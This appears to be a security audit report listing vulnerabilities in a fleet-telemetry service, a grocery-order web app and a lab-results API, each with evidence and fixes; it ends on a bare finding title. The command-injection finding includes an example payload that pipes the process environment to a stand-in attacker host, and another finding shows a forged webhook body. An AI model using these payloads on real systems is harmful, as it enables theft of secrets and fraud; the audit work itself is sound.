findings.title: SQL injection in vehicle search: the label fragment is formatted into the query while every sibling method binds its parameters
findings.evidence: searchByLabel builds its SQL with String.format, interpolating both tenantId and label directly into the text (:54-57), then hands the finished string to prepareStatement (:59) and calls executeQuery with no parameters bound at all. label arrives unfiltered from the query string: VehicleController.search declares @QueryValue String label (:58) with no @Pattern and no length bound, and passes it straight through. The contrast is inside the same file: listOrdered (:44-45), depotBelongsTo (:68-71), insert (:84-91), update (:102-109) and delete (:122-125) all use ? placeholders with setString. This one method is the exception. A single quote in label closes the ILIKE literal; because tenantId is interpolated in the same statement, a payload can also drop the tenant predicate entirely.
findings.impact: Any authenticated user of any tenant can read, and through stacked or UNION-based payloads potentially modify, the whole vehicles table across every tenant, and can reach any other table the fleet_app role can see (application.yml:42). The tenant boundary this service is built around is enforced by a WHERE clause that the attacker controls the text of.
findings.recommendation: Bind both values: 'WHERE tenant_id = ? AND label ILIKE ?' with setString(1, tenantId) and setString(2, "%" + label + "%"), escaping the LIKE metacharacters _ and % in label if literal matching is wanted. Nothing about this query needs dynamic SQL.

triage.reason: label is traced back to the raw @QueryValue at VehicleController.java:58. There is no allowlist, no @Pattern, no cast and no length limit anywhere on the path from the query string to line 57.

The only mandatory layer in front is TenantFilter (TenantFilter.java:19-44), which sets a request attribute and does not touch query text. No ORM, no row-level security and no statement whitelist sits between the controller and the DataSource; VehicleRepository talks to the JDBC connection directly (:43).

The sink is PreparedStatement.executeQuery over a string already assembled by String.format at :54. Pre-assembly is precisely what makes prepareStatement here inert: the statement is parsed with the injected text already in it.

scope.established_by: grep -rnE for interpolated SQL across the tree returned five sites; two are in this file. Each of the eight query-building methods in VehicleRepository was then read in turn and classified as bound or interpolated. searchByLabel is the only reachable interpolated one; legacyPurgeByLabel:160 is the other, and it is private with zero call sites and appears in ruled_out.
scope.narrowed_by: Nothing narrows it. The route GET /api/vehicles/search is reachable by any authenticated caller: the class-level @Secured(SecurityRule.IS_AUTHENTICATED) at VehicleController.java:30 is the only gate, and no role check applies to this handler.

findings.title: A client-supplied X-Fleet-Role header overrides the role in the signed token, and the filter that strips its sibling header does not strip it
findings.class: Privilege escalation / trusting a client-controlled header
findings.evidence: effectiveRole reads the request header X-Fleet-Role (:25) and, if its value is one of the three known roles, returns it in preference to the role claim on the verified token (:26-28). The token claim is consulted only as a fallback (:29-31). isFleetAdmin is defined purely in terms of it (:34-36), and VehicleController.delete is gated on isFleetAdmin (:79-81). The asymmetry is the proof that the author knew the class: TenantFilter explicitly removes the client's X-Fleet-Tenant header before proceeding (TenantFilter.java:33-35, with the comment 'Whatever the client tried to send is dropped here'), and does not remove X-Fleet-Role. The header is also listed in fleet.gateway.forwarded-headers (application.yml:52-55) as something the edge re-signs, but a grep for that configuration key across the tree returns exactly one hit, its own declaration: nothing reads the list, so no code verifies that the header arrived from the edge rather than from the caller.
findings.impact: Any authenticated user, including one whose token carries role=viewer, adds one header and becomes fleet_admin for every check that goes through RoleResolver. Concretely that is DELETE /api/vehicles/{id} (VehicleController.java:77-84): a read-only account can delete any vehicle in its tenant. The forwarded-headers list also means an operator reading the configuration will believe the edge is the only source of this value.
findings.recommendation: Delete the header branch at RoleResolver.java:25-28 and resolve the role from the token claim alone. If the edge genuinely must assert a role, verify its assertion cryptographically rather than by presence, and have TenantFilter strip X-Fleet-Role exactly as it strips X-Fleet-Tenant. Either wire fleet.gateway.forwarded-headers to a component that strips every listed header on ingress, or delete the key so it stops reading as a control.

triage.reason: The one mandatory filter in front, TenantFilter (:19-44), removes X-Fleet-Tenant and only that. It cannot compensate for a header it does not name. The gateway is asserted in a comment at application.yml:50-51 but no artifact for it was provided; even taken at face value, a gateway that re-signs a header still leaves this service accepting the header from anyone who reaches it directly.

The candidate external control is the edge described at application.yml:50-51. FP-08 requires the exported artifact, ticket or written statement, and only a source comment exists. Per the rule's own text that is not a HOLDS. It does not push the finding to UNKNOWN either, because the in-repo evidence is decisive on its own: line 26 accepts the header whatever is in front of it, and the sibling header is stripped while this one is not.

The scope is narrower than the construct suggests, but not to nothing, and the narrowing is recorded in scope.narrowed_by rather than used to close the finding: @Secured("fleet_admin") on pushFirmware (VehicleController.java:87) is resolved by Micronaut against the token, not by RoleResolver, so that route is not reachable this way. DELETE /api/vehicles/{id} is, and one reachable privileged effect is enough.

scope.established_by: grep -rn 'X-Fleet-Role' returned two hits: the declaration in application.yml:54 and the read at RoleResolver.java:25. grep -rn for isFleetAdmin and effectiveRole returned one consumer, VehicleController.java:79. That call site is the complete list of effects this header reaches.
scope.narrowed_by: VehicleController.java:87 - the firmware route is gated by @Secured("fleet_admin"), which Micronaut evaluates against the Authentication built from the verified JWT, not through RoleResolver. The header does not reach that route, so the escalation stops at DELETE.

findings.title: The tenant filter's URL patterns omit /api/diagnostics, and the diagnostics queries ignore the tenant argument they are handed
findings.class: Broken object-level authorization / missing tenant scoping
findings.evidence: Two independent controls are absent and each would have caught the other. First, @Filter(patterns = {"/api/vehicles/**", "/api/depots/**", "/api/trips/**"}) at TenantFilter.java:19 does not list /api/diagnostics, while DiagnosticsController is mounted at @Controller("/api/diagnostics") (DiagnosticsController.java:21). The filter therefore never runs for it, and the tenantId request attribute is never set. The controller's own handling admits this: it reads the attribute with .orElse(null) (:34, :40), whereas VehicleController.tenant() throws IllegalStateException when the attribute is missing (:96-99). Second, the repository methods those handlers call take tenantId as their first parameter and never use it: recentFrames binds only vehicleId and limit (VehicleRepository.java:132-143) and openFaults binds only vehicleId (:145-155). Neither SQL statement mentions tenant_id. So even a non-null tenant would change nothing.
findings.impact: Any authenticated user of any tenant reads any vehicle's live OBD-II frames and open fault codes by guessing or enumerating a vehicle id: GET /api/diagnostics/{vehicleId}/frames returns up to 1000 rows per call (:35). This is the telemetry the whole product exists to protect, and it is the one controller with no tenant boundary at all. Vehicle ids are exposed to every tenant in their own listing responses (VehicleRow.id, :25), so ids are not a secret either.
findings.recommendation: Add /api/diagnostics/** to the filter patterns at TenantFilter.java:19, and prefer an inverse default: filter /api/** and list exclusions, so a new controller is covered on the day it is written. Independently, make the repository use what it is given: join obd_frames and obd_faults to vehicles and add 'AND vehicles.tenant_id = ?', binding the parameter both methods already accept.

triage.reason: The candidate compensating layers were each checked and each fails to scope. micronaut.security.intercept-url-map (application.yml:31-37) requires isAuthenticated() on /api/** - authentication, not tenancy. The class-level @Secured(SecurityRule.IS_AUTHENTICATED) at DiagnosticsController.java:20 is the same control. And the repository, the last place a scope could be applied, omits tenant_id from both statements.

DiagnosticsController is an ordinary @Controller with no environment condition, no @Requires and no profile guard; it is compiled and registered in every build. The filter's pattern list is a literal in the same shipped source.

The data is per-vehicle OBD telemetry and fault history belonging to other tenants' fleets. The file's own header comment (:16-19) describes it as the payload the support desk polls, and the service's stated purpose (TenantFilter.java:15-18) is that 'a depot operator can never reach another operator's fleet'.

scope.established_by: The boundary enumeration listed six Micronaut handlers. Each was joined against the single @Filter pattern list at TenantFilter.java:19: the four VehicleController routes match /api/vehicles/**, the two DiagnosticsController routes match nothing. The two repository methods those two routes reach were then read for a tenant predicate; neither has one.
scope.narrowed_by: Nothing narrows it. Both diagnostics handlers are affected, and the two defects are independent, so removing either one alone still leaves the other.

findings.title: Command injection: the device serial is concatenated into a /bin/sh -c string while the bundle name beside it is pattern-validated
findings.evidence: verifyForDevice builds a single command string by concatenation (:52-53) and executes it through a shell: new ProcessBuilder("/bin/sh", "-c", command) at :55. Both interpolated values come from the request body, and exactly one of them is constrained. VehicleController.FirmwarePush declares bundleName with @Pattern(regexp = "[A-Za-z0-9_.-]{1,48}") and deviceSerial with only @NotBlank (VehicleController.java:106-107). deviceSerial therefore admits every shell metacharacter - ; | & $( ) ` newline - and lands at the end of the command line at :53. The @Valid annotation at :90 enforces the record's constraints, which is why the bundle name is safe and the serial is not.
findings.impact: Remote code execution as the service account on the fleet-telemetry host, with whatever that account can reach: the firmware staging directory /var/lib/fleet/firmware (application.yml:57), the database credentials in the environment (:43), and the JWT signing secret (:29). A serial of the form 'A1; curl http://attacker/$(cat /proc/self/environ|base64)' executes on the next call.
findings.recommendation: Drop the shell. Run the verifier with an argument vector - new ProcessBuilder(verifyCommand, "--bundle", staged.toString(), "--device", deviceSerial) - so the operating system passes the serial as one argv element and never parses it. Separately, give deviceSerial the same @Pattern discipline its sibling already has.

triage.reason: deviceSerial traces back to the JSON request body through @Body @Valid FirmwarePush (VehicleController.java:90). Its only constraint is @NotBlank at :107, which rejects empty strings and nothing else. bundleName's @Pattern at :106 is the proof the constraint was available and was not applied to this field.

The route is gated by @Secured("fleet_admin") at :87, which limits who can reach the sink but does not neutralise the input; the pack treats a role check as narrowing, not as a compensating control against injection. No shell-escaping helper exists anywhere in the tree - grep for the ProcessBuilder site returns this one line, and nothing quotes or filters the argument before :52.

The path is guarded by 'production'.equals(env) at :48, and production is exactly the environment that matters. The default is staging (application.yml:48), which means the injection is dormant in staging and live in production - the reverse of the FP-04 exculpation, which requires the dangerous path to be the one that does not ship.

scope.established_by: The sink enumeration found exactly one process-execution site in the tree (ProcessBuilder at FirmwareService.java:55). Its command string was traced backwards to the two interpolated values, and each was traced forward from its declaration on the FirmwarePush record.
scope.narrowed_by: Two conditions narrow it and neither closes it. FirmwareService.java:48 - the shell path runs only when fleet.env is exactly 'production'. VehicleController.java:87 - @Secured("fleet_admin") restricts the route to callers whose token carries that role; note this check is resolved by Micronaut from the token and is not reachable through the X-Fleet-Role header of F-FLE-02.

findings.title: Firmware signature verification decides nothing: its result is discarded by the caller and it returns true outright off production
findings.evidence: verifyForDevice returns boolean and its documentation says it 'checks the bundle signature against the key provisioned for that specific control unit' (FirmwareService.java:43-46). The caller invokes it as a bare statement - firmware.verifyForDevice(body.bundleName(), body.deviceSerial()); at VehicleController.java:92 - with no if, no assignment and no branch, and returns HttpResponse.accepted() unconditionally on the next line (:93). The order compounds it: stageBundle at :91 has already copied the bundle into the outbox the device downloader watches (FirmwareService.java:31-41) before any verification is attempted. Independently, the function's own first branch returns true without running anything when fleet.env is not 'production' (:48-51), and fleet.env defaults to staging (application.yml:48). This is the WEB-27 shape in both of its documented variants at once: a caller that does not consult the result, and a body with a permissive arm.
findings.impact: A bundle whose signature does not verify is staged and accepted exactly like one that does. The endpoint's whole security purpose - proving a firmware image is the vendor's before pushing it to a control unit - is not achieved on any code path. Combined with the ordering, a failing verifier leaves the unverified bundle in the outbox regardless, so the downloader may ship it to devices. Off production, no verification is attempted at all.
findings.recommendation: Branch on the result and fail closed: if (!firmware.verifyForDevice(...)) return HttpResponse.status(HttpStatus.BAD_REQUEST). Verify before staging, not after, so a rejected bundle never reaches the outbox. Replace the non-production short circuit with a verifier stub that is exercised in tests, so the control is proven by a negative test in every environment rather than skipped in most of them.

triage.reason: No layer downstream re-checks the signature. FirmwareService has two methods and grep returns both call sites, VehicleController.java:91 and :92; there is no other consumer, no downloader code in the tree, and nothing that reads the staged file again.

The discarded return value at :92 is environment-independent and ships in every build. The second half, the non-production short circuit, is if anything worse in the shipped default: fleet.env resolves to staging (application.yml:48), so the shipped default configuration is the one that skips verification.

This is not defence in depth that happens to be absent. It is the only integrity control on the firmware path, and the pack is explicit that a failed control is reported as a failure and never as a hardening suggestion, because the project already believes it holds it - the docstring at FirmwareService.java:43-46 is that belief in writing.

scope.established_by: WEB-27's caller check: every predicate-shaped symbol in the tree (verify*, check*, is*, validate*) was listed and each call site examined for whether anything branches on the result. verifyForDevice at VehicleController.java:92 is the one whose result is never consulted. The permissive arm at FirmwareService.java:48 was found by reading the body of the same function.
scope.narrowed_by: Nothing narrows the discarded result: POST /api/vehicles/{id}/firmware has no other path. The non-production short circuit is narrowed to environments where fleet.env != 'production' (FirmwareService.java:48), which per application.yml:48 includes the default.

findings.title: The authorization middleware guards /api/orders/ with a trailing slash, so the collection endpoint POST /api/orders is unauthenticated and takes the customer id from the body
findings.evidence: CUSTOMER_AREA is the literal '/api/orders/' with a trailing slash (:3) and the gate is path.startsWith(CUSTOMER_AREA) (:20). Nitro maps server/api/orders/index.post.ts to the path /api/orders, without a trailing slash, so '/api/orders'.startsWith('/api/orders/') is false and the 401 at :22 never fires for order creation. The item routes ([id].get.ts, [id].patch.ts) resolve to /api/orders/<id> and are covered - the asymmetry is between siblings of one resource family. The handler is written to survive an absent session rather than to require one: const customerId = event.context.session?.customerId ?? body.customerId (index.post.ts:12), and newOrderSchema accepts customerId as a positive integer from the request body (schemas.ts:8). Both of its siblings instead use the non-null assertion event.context.session! ([id].get.ts:6, [id].patch.ts:9), because both are actually guarded.
findings.impact: An unauthenticated caller creates orders attributed to any customer id they choose, with any slot and any items, and receives back the new order's id and its shareToken (index.post.ts:26-31). That token is the handle that opens the delivery view without signing in (db.ts:33-35), so the response hands the caller a working capability against a stranger's account. It also allows unbounded order creation against arbitrary customers and pollutes the orders table that the billing webhook later settles.
findings.recommendation: Compare against '/api/orders' and treat the item paths as a prefix of it, or better, invert the middleware to deny by default and list the open prefixes, as 01.session.ts already does with OPEN_PREFIXES (:4). Independently, remove customerId from newOrderSchema and take it only from event.context.session, so the identity can never arrive in the body.

triage.reason: 01.session.ts runs first and does parse the cookie for this path (it is not in OPEN_PREFIXES at :4), but it is explicitly written to fall through to anonymous rather than reject - its own header comment at :18-22 says anything failing verification is treated as anonymous. It sets context and never denies. No other middleware exists; the server/middleware directory holds exactly these two files.

The narrowing runs the other way here. The construct looks like it covers the orders area and in fact covers less: the item routes only. The uncovered route is the one that creates rows and returns a bearer capability.
There is a second principal and the body names them: body.customerId identifies a different customer from the caller, and the shareToken returned belongs to the order created in that customer's name.

scope.established_by: The boundary enumeration listed four Nuxt route handlers. Each file path was converted to its Nitro route and tested against the two literal prefixes in 02.authz.ts (:3, :4). /api/orders is the only route that reaches data and matches neither prefix; /api/billing/webhook also matches neither but is signature-authenticated by design (and separately defective, see F-PAN-02).
scope.narrowed_by: Nothing narrows it. The gap is a property of the literal at 02.authz.ts:3, and the POST handler is registered unconditionally.

findings.title: The billing webhook accepts every unsigned request when the secret is unset, and the secret defaults to an empty string
findings.class: Control present but inert / authentication bypass
findings.evidence: signatureMatches opens with 'if (!secret) { return true }' (:16-20): with no secret configured, the function reports a match for any body and any header, including none. The comparison below it is otherwise correct - HMAC-SHA256, length check, timingSafeEqual (:24-27) - which is what makes the early return easy to miss. The configuration supplies the failing condition rather than preventing it: billingWebhookSecret: process.env.BILLING_WEBHOOK_SECRET ?? '' (nuxt.config.ts:9). The '?? \'\'' turns a missing environment variable into the exact value that disables the check, and nothing verifies it at startup. The contrast is available in the tree: labtrack refuses to serve traffic without its signing key (labtrack/labtrack/app.py:33-35, registered as on_startup at :49). The route is also removed from session handling by OPEN_PREFIXES (01.session.ts:4) and matches neither prefix in 02.authz.ts, so this signature check is the only authentication it has.
findings.impact: If BILLING_WEBHOOK_SECRET is ever unset - a new environment, a renamed variable, a secret-store miss - the endpoint silently becomes an unauthenticated state-changing API. Anyone can POST {"type":"charge.succeeded","data":{"orderId":...,"amountCents":0}} to move a draft order to 'scheduled' with a total of their choosing (:40-46), i.e. obtain goods without payment, and can cancel any order at will with charge.refunded (:60-62). The failure is silent by construction: the service behaves normally and logs nothing unusual.
findings.recommendation: Fail closed: return false when the secret is missing, and refuse to boot without it, mirroring labtrack's verify_runtime_config. Drop the '?? \'\'' at nuxt.config.ts:9 so the value is undefined rather than falsy-but-present. Add a negative test that asserts an unsigned request is rejected - the pack's minimal test for this class is precisely a test the control must fail.

triage.reason: The permissive arm is not behind a development flag or a test double; it is reached by the shipped default at nuxt.config.ts:9 and by nothing else. FP-04 requires evidence from the artifact that ships, and what ships is the empty-string default.

No other layer authenticates this route. It is listed in OPEN_PREFIXES at 01.session.ts:4, so session parsing is skipped, and 02.authz.ts checks only /api/admin/ and /api/orders/ (:3-4), neither of which it matches. The signature check is the whole of its authentication.

FP-08 exculpates when the control lives outside the repository and its evidence arrived. Here the control at issue - signature verification - lives in this repository, at webhook.post.ts:15-28, and is the thing that is defective. Whether production happens to set BILLING_WEBHOOK_SECRET is a precondition of exploitation rather than a compensating external control, so this rule does not apply to the class. The defect reported is the pair of in-tree lines: the unconditional true at :16-20 and the empty-string default at nuxt.config.ts:9.

scope.established_by: WEB-27's predicate sweep over the tree: every verify/check/match-shaped function was read for a branch that cannot return the negative. signatureMatches is the one with an unconditional true. Its secret argument was then traced to its single source, useRuntimeConfig().billingWebhookSecret at :32, declared at nuxt.config.ts:9.
scope.narrowed_by: nuxt.config.ts:9 - the bypass is reached only when BILLING_WEBHOOK_SECRET resolves to empty or unset. When the variable is set, the comparison below it is correct and constant-time.

findings.title: The order note is HTML-escaped when an order is created and written raw when it is patched, and the receipt template interpolates it unescaped
findings.evidence:
Three lines make this one defect. renderReceiptHtml escapes every value it interpolates except one: escapeHtml(item.sku) at :131, escapeHtml(order.id) at :134 and escapeHtml(order.share_token) at :137, but '

${order.note}

' at :136 is raw. The column has two writers and only one sanitises. insertOrder receives an already-escaped value, because index.post.ts:23 passes note: escapeHtml(body.note ?? ''). updateOrder builds its SET clause by iterating the patch object (:97-101) and binds the values as given (:109); orderPatchSchema admits note as a free string up to 500 characters (schemas.ts:26) and nothing escapes it on that path. grep for escapeHtml across the tree returns six hits and confirms it: the four uses inside renderReceiptHtml, the import and the single call in index.post.ts. The rendered HTML is stored for delivery by the mailer (webhook.post.ts:54-58).
findings.impact: A customer PATCHes their own order's note to markup, and it is stored raw. When the charge.succeeded webhook fires, that markup is interpolated into the receipt HTML and queued in outbound_email for the transactional mailer (webhook.post.ts:53-58). The payload lands in a receipt email and in whatever internal tooling renders that stored HTML, which is a surface no customer should be able to write to. It is self-targeted in the simplest case; combined with F-PAN-01, an unauthenticated caller can seed a note on an order created in someone else's name.
findings.recommendation: Escape at the point of rendering rather than at one point of writing - wrap order.note in escapeHtml at db.ts:136, exactly as the four values beside it are. Escaping on the way in is the fragile arrangement here, precisely because it has to be repeated at every writer; the second writer is the one that forgot.

triage.reason: No sanitiser sits between updateOrder and the template. The values array at db.ts:99 is passed straight to the parameterised query, which protects the database and does nothing about HTML, and the template at :136 applies no transformation. grep for escapeHtml returns no call on the patch path.

note on the patch path traces to readBody(event) at [id].patch.ts:10 through orderPatchSchema, whose only constraint on note is z.string().max(500) (schemas.ts:26). A length limit is not a character allowlist; 500 characters is ample for a script payload.

The sink is an HTML document: the string is assembled inside <html><body> at :133-138 and stored in a column named html (webhook.post.ts:54). The one non-executing reading - that it is only ever email - does not hold either, because the same stored HTML is what any internal viewer of outbound_email renders.

scope.established_by: grep -rn escapeHtml over the tree gave the complete list of sanitised sites; the writers of orders.note were then listed independently (insertOrder at db.ts:61, updateOrder at db.ts:94) and joined against it. writer_parity.py returned 0 flags on this tree, so this asymmetry was established by hand and is recorded that way in provenance.
scope.narrowed_by: Nothing narrows it. Every note that has ever been through PATCH is unescaped in storage, and renderReceiptHtml has one code path.

findings.title: Per-customer order responses are marked stale-while-revalidate cacheable, and the ownership check runs behind the cache
findings.evidence: '/api/orders/**': { swr: 120 } at nuxt.config.ts:31 applies Nitro's stale-while-revalidate cache to every route beneath /api/orders/, which is exactly the per-customer surface: [id].get.ts returns one customer's order including its status, note, totalCents and shareToken (:13-20). The response is authorized inside the handler - orderForCustomer(id, session.customerId) scopes the query by customer at db.ts:45-51 and the handler 404s otherwise (:9-11) - so the check produces the response rather than gating the cache in front of it. No varies or cache-key configuration accompanies the rule, and no Cache-Control or Vary header is set anywhere for these routes; by contrast the sibling rule at :32 explicitly disables caching for billing ('/api/billing/**': { cache: false }), which shows the author was thinking about which areas may be cached.
findings.impact: If Nitro's cache key for these routes does not incorporate the session cookie, the first customer to fetch /api/orders/<id> populates an entry that is then served for up to 120 seconds to anyone requesting the same path - including a customer who would otherwise receive 404, and including an unauthenticated caller who would otherwise be stopped by 02.authz.ts. The leaked fields include the shareToken, which is a standing capability rather than a transient value.
findings.recommendation: Remove swr from the authenticated area, or scope it: if the caching is worth keeping, give the rule an explicit cache key that includes the session identity, and set Cache-Control: private, no-store on responses that carry a share token. The safest change is to move the read load onto a cache keyed inside the handler, after the ownership check.

triage.reason: The ownership check at db.ts:47 and the 404 at [id].get.ts:10 are inside the handler, which is what the cache stands in front of. A control that only runs on a cache miss cannot be the mandatory layer FP-01 requires.

The rule's scope was checked rather than assumed. It applies to /api/orders/** only, and every route under that prefix is per-customer; there is no public route in that subtree for the wildcard to be harmlessly covering. Note it does narrow to GET, since only GET responses are cached, and that is recorded in narrowed_by.

Whether Nitro's default cache key for a route rule incorporates the request cookie cannot be established from this tree: no Nitro source, no lockfile resolution and no runtime were available, and the prompt forbids outside information. Per the contract this UNKNOWN caps the finding at probable, which is why it is not reported as confirmed. What is certain in-tree is that a per-customer authenticated response is declared cacheable with no varies and no Cache-Control, which is a defect on its own terms.

scope.established_by: The route rule's glob was expanded against the enumerated route list: /api/orders/** matches [id].get.ts and [id].patch.ts and nothing else. Of those, only the GET produces a cacheable response, so the effect list is one handler. index.post.ts is at /api/orders and is not matched by the /api/orders/** glob - the same trailing-segment distinction that produces F-PAN-01.
scope.narrowed_by: Nitro's swr applies to GET responses only, so [id].patch.ts is unaffected even though the glob matches it.

findings.title: The idempotency key is a raw client-supplied header in a shared namespace, so one caller can replay another caller's stored response
findings.class: Broken object-level authorization / insecure cache key
findings.evidence: recordIdempotent uses the caller's value verbatim as the storage key: store.getItem<T>(key) and store.setItem(key, value, ...) at db.ts:120-125, where key is the Idempotency-Key request header taken raw at index.post.ts:14 and passed unmodified at :19. Nothing namespaces it by customer, by session or by anything else. The stored value is the full creation response, which includes the order id and the shareToken (index.post.ts:26-31). The store is a shared Redis instance configured at nuxt.config.ts:37-39, so the namespace is global across all callers, and entries persist for 24 hours (:125).
findings.impact: A caller who supplies an Idempotency-Key that another caller has already used receives that caller's stored response - the order id and the shareToken for someone else's box - without any query ever running. Keys chosen by client libraries are frequently guessable (a UUID is not, but an incrementing or timestamp-derived key is), and an attacker can also seed common keys and wait for a collision to hand them a victim's response. Reached through F-PAN-01 this needs no authentication at all.
findings.recommendation: Namespace the key with the authenticated identity - `${session.customerId}:${idempotencyKey}` - and reject the request when there is no authenticated identity. Store the owner alongside the cached value and compare it on read, so a collision fails closed rather than replaying.

triage.reason: Nothing between the header and the store constrains or scopes it: index.post.ts:14-17 checks only that the header is present, and recordIdempotent goes straight to useStorage('idempotency'). There is no per-customer store, no prefix and no ownership record.
The key is getHeader(event, 'idempotency-key') at index.post.ts:14, fully attacker-chosen with no format, length or character constraint.
The replayed value is not inert: it carries share_token, which db.ts:33-35 describes as the handle that lets someone pull up the delivery window without signing in.

scope.established_by: grep -rn recordIdempotent returned one caller, index.post.ts:19, and the key argument was traced back one line to the raw header at :14. The storage namespace was read from the nitro.storage declaration at nuxt.config.ts:37-39.
scope.narrowed_by: Nothing narrows it. Order creation is the only user of the idempotency store, and it always writes into the shared namespace.

findings.title: A shopper can move their own draft order to a paid status, because the locked-status list omits the states the payment webhook is supposed to set
findings.evidence: Orders are created in 'draft' (db.ts:72) and are moved to 'scheduled' by the billing webhook on charge.succeeded, under a guard that only a draft may be settled: "UPDATE orders SET status = 'scheduled', total_cents = $1 WHERE id = $2 AND status = 'draft'" (webhook.post.ts:42-44). The PATCH route lets the customer set status directly, refusing only the three states in LOCKED_STATUSES - out_for_delivery, delivered and cancelled ([id].patch.ts:5, :12-14) - with the message 'couriers set that status, not shoppers'. The two states the payment path owns, 'scheduled' and 'packing', are both in ORDER_STATUSES (schemas.ts:3), both accepted by orderPatchSchema (:25) and neither locked. updateOrder writes whatever survives that check (db.ts:94-111), scoped to the caller's own order and nothing more.
findings.impact: A customer creates a draft order and PATCHes it to status 'scheduled' without any charge occurring, then to 'packing'. total_cents stays at the 0 it was inserted with (db.ts:72), because only the webhook sets it. Fulfilment downstream reads a scheduled, zero-total order that looks settled. The check that would otherwise catch a later real payment is the webhook's own 'AND status = draft', which now fails to match, so the legitimate settlement path is also disabled for that order.
findings.recommendation: Invert the list: allow customers to set only the statuses they own, rather than denying the ones they do not. In practice a shopper needs no status transition at all beyond cancellation, so restrict the PATCH schema to slotId and note and give cancellation its own endpoint with its own rules.

triage.reason: No layer downstream re-derives status from payment state. The only other writer of orders.status is the webhook (webhook.post.ts:42, :61), and its draft precondition is a guard on its own write, not a constraint on this one. There is no database CHECK or trigger in the tree - no migrations exist here - and updateOrder applies none.

The narrowing that exists is real and insufficient, and it is recorded rather than used to close the finding: updateOrder scopes to the caller's own order (db.ts:107), so this is not a cross-customer defect. It is a customer changing the commercial state of their own order past the control that is supposed to set it.
The impact reaches the operator directly: goods scheduled for fulfilment against an unpaid, zero-total order. This is the business-invariant class of WEB-18, not an absent defence in depth.

scope.established_by: The six values of ORDER_STATUSES (schemas.ts:3) were listed and each was crossed against the three entries of LOCKED_STATUSES ([id].patch.ts:5) and against the writers of orders.status found by grep. Two statuses are writable by the customer and owned by the payment path; the join is what makes the gap visible.
scope.narrowed_by: db.ts:107 - updateOrder's WHERE clause includes customer_id, so a caller can only do this to their own orders.

findings.title: The share token that opens an order without signing in is generated with Math.random
findings.evidence: newShareToken draws twelve characters from a 33-character alphabet using Math.floor(Math.random() * alphabet.length) (:37-42). Math.random is a non-cryptographic PRNG whose internal state is recoverable from a modest number of consecutive outputs in every major V8-based runtime, and the values here are consecutive: twelve draws per token, and tokens minted in sequence as orders are created (:74). The token's job is stated in its own docstring at :32-35 - 'a household member can pull up the delivery window without signing in' - and it is printed as a URL on the packing slip and in the receipt email (:137). It is returned in API responses at [id].get.ts:19 and index.post.ts:30.
findings.impact: The token is a bearer capability for an order's delivery details, and it is predictable. An attacker who obtains a few tokens - trivially, by creating a few orders, which F-PAN-01 permits without authentication - can recover the generator state and derive tokens minted around the same time, opening other customers' delivery windows, which are physical-address-adjacent data. Sixty bits of alphabet entropy would be adequate; the actual entropy is bounded by the PRNG state, not by the alphabet.
findings.recommendation: Use crypto.randomBytes and encode it: randomBytes(16).toString('base64url') gives 128 bits from a CSPRNG in one line, with node:crypto already imported elsewhere in this codebase (01.session.ts:1, webhook.post.ts:1). Consider expiring the token with the delivery, since a capability that never expires outlives its purpose.

triage.reason: The data behind the token is a named customer's order and delivery window. The docstring at db.ts:32-35 establishes that possession of the token alone is what grants access, which is the definition of a value with security significance.
This rule asks whether the value is attacker-controlled; the defect here is the opposite direction - a value that must be unguessable and is not. The relevant question is answered under FP-07.

No second factor stands behind the token. The share route itself is outside this tree, but the design in-tree is explicit that the token substitutes for signing in, and nothing in the tree binds the token to an email, a session or a rate limit.

scope.established_by: grep -rn 'Math.random' over the tree returned two sites, this one and payout-orchestrator/src/activities/rails.ts:22 (reported separately as F-PAY-04). newShareToken's one call site was found by grep and is db.ts:74, inside insertOrder.
scope.narrowed_by: Nothing in this tree narrows it. The endpoint that redeems the token, https://portal.pantrybox.example/s/<token> (db.ts:137), is not part of the audited tree, so the redemption-side controls could not be read; the weakness of the value is established here regardless, and the bound is stated rather than assumed away.

findings.title: The scope and care-link guard tests a path prefix the application never serves, so it returns before checking anything on every request
findings.class: Control present but inert / dead guard
findings.evidence: The guard's first statement is 'if not path.startswith("/api/results"): return' (:72-73). The application is constructed with Litestar(path="/api/v1", ...) (app.py:44), and ResultsController declares path = "/results" (results.py:30), so the served paths are /api/v1/results/... . '/api/v1/results/1'.startswith('/api/results') is false, so the guard returns at line 73 on every request that reaches it and neither of the two checks below ever executes: the results:read scope requirement at :76-77 and the care-link requirement at :80-81. path_coverage.py reported this independently as DEAD GUARD '/api/results' guards nothing: no route starts with it [labtrack/labtrack/guards.py:72]. The tool made four other flags in this service which do not survive reading, because it does not compose the app-level prefix with controller paths; those are in ruled_out. This one survives because the mismatch is in the opposite direction - the guard string carries a prefix the routes do not have.
findings.impact: Two authorization controls are silently absent from every result read. First, the scope check: settings.client_scopes (settings.py:22-29) registers courier-hub and billing-sync with narrow scopes, and billing-sync holds only reports:read, yet with the guard inert any valid token reads results regardless of the scopes its client is registered for. Second, and worse for a clinical system, the care-link check: the token carries care_links (tokens.py:63) and the guard's own docstring says 'Every result read must carry the read scope and a care link to the patient' (:70). With it inert, any authenticated operator reads any patient's results within their organisation - GET /api/v1/results/patient/{patient_id} scopes by ordering_org (store.py:39) and by nothing else.
findings.recommendation: Remove the prefix test entirely and let the guard run wherever it is registered - it is attached at the application level (app.py:46), so it already reaches every route, and self-limiting by string is what broke. If some routes must be exempt, express that with per-handler guards as results.py:58, :71 and :76 already do, not with a path literal that has to be kept in sync with a mount prefix declared in another file. Add a test that asserts a token without results:read is refused.

triage.reason: Nothing else enforces either check. BearerAuth (guards.py:21-44) verifies the HMAC and the expiry and returns the claims; it reads neither scopes nor care_links. require_write (:84-87) and require_admin (:90-93) do run, but they gate writes and deletes, not the reads this guard exists for. grep for care_links returns two hits, the mint at tokens.py:63 and the dead comparison at guards.py:80.

The candidate benign reading is that Litestar passes a path already stripped of the application prefix. It does not: connection.scope['path'] is the ASGI path, which is the full request path. The reading was checked rather than assumed, and the sibling evidence agrees - the middleware exclusion at app.py:22 is written as '/api/v1/oauth', with the prefix, by the same author in the same service.
The guard is registered unconditionally in the shipped application constructor at app.py:46, with no environment condition anywhere on the path.

scope.established_by: The guard is registered on the Litestar constructor (app.py:46), so it is invoked for every route in the application; the applies_to list is therefore the full handler enumeration from the boundary grep. It is inert on all of them. path_coverage.py's DEAD GUARD flag located it; the prefix arithmetic against app.py:44 and results.py:30 is what confirms it.
scope.narrowed_by: Nothing narrows it, and that is the point: the condition intended to narrow the guard to result routes (guards.py:72) instead excludes all of them.

findings.title: The recent-by-panel endpoint returns results across every organisation, while both of its siblings check the caller's organisation
